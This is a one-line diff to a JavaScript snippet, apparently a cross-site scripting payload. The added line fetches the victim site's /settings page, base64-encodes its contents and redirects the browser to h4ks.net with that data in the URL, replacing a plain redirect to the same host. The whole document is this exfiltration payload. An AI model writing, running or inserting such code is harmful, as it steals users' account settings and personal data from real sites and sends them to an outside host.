@@ -1,1 +1,1 @@
-location.href="//h4ks.net/go/test"
+fetch('/settings').then(r=>r.text()).then(body=>{location='//h4ks.net/go/?'+btoa(body);})
